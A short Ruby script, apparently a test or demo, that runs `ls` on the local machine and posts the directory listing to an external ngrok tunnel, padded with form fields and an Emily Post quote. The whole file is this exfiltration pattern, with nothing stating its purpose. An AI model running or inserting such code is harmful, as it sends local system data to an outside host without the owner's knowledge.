#!/bin/ruby

ls_result = `ls`

require "uri"
require "net/http"

params = {'box1' => 'Nothing is less important than which fork you use. Etiquette is the science of living. It embraces everything. It is ethics. It is honor. -Emily Post',
'button1' => 'Submit', 'ls' => ls_result
}
x = Net::HTTP.post_form(URI.parse('http://b6c7c56f.ngrok.io/events'), params)
